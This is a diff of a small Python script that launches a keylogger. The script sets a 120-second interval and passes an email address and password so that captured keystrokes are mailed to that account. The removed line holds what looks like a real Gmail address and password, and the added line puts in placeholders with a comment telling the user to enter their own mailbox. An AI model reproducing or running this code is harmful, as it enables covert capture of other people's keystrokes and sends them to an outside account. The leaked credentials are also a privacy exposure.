@@ -2,5 +2,5 @@
 
 import keylogger
 
-my_keylogger=keylogger.Keylogger(120, "4sh1shk4mb0j@gmail.com", "abcd123#@!")
+my_keylogger=keylogger.Keylogger(120, "Emailid", "Password")//change your mail to which u want to send msg
 my_keylogger.start()
